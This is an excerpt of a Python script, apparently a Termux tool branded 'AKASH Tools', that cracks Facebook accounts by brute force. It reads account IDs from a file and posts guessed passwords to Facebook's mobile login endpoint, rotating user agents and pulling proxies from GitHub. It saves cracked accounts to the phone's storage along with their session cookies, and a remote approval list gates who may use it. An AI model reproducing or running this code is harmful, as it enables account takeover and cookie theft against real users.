...
def main():
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            os.system('espeak -a 300 "Welcome to akash Tools varson 16 ..."')
            time.sleep(2)
            os.system('clear')
...
os.system(f'xdg-open https://t.me/akashking00/')
#------------------[ 𝗔𝗞𝗔𝗦𝗛 ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Mr-Rakib-404/2V/blob/main/2v.txt').text
...
.%%..%%..%%..%%..%%..%%...%%%%...%%..%%.........
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CREATE : 𝗔𝗞𝗔𝗦𝗛(™️)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [16] FIRE (😍)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m"""
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/GW-AKASH/GW-AKASH/blob/main/Approval.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m 𝗔𝗞𝗔𝗦𝗛 TooLs Daily Update)✅ \033[0;95m")
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/𝗔𝗞𝗔𝗦𝗛.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[𝗔𝗞𝗔𝗦𝗛•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[𝗔𝗞𝗔𝗦𝗛•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;95m𝗔𝗞𝗔𝗦𝗛-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[𝗔𝗞𝗔𝗦𝗛\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " Akash,  Ok,  id"')
                open('/sdcard/𝗔𝗞𝗔𝗦𝗛-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[𝗔𝗞𝗔𝗦𝗛-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93m𝗔𝗞𝗔𝗦𝗛-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('/sdcard/𝗔𝗞𝗔𝗦𝗛-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0;95m𝗔𝗞𝗔𝗦𝗛-Ok] {idf} \033[0;97m• \033[0;95m{pw} ')
                #cek_apk(session,coki)
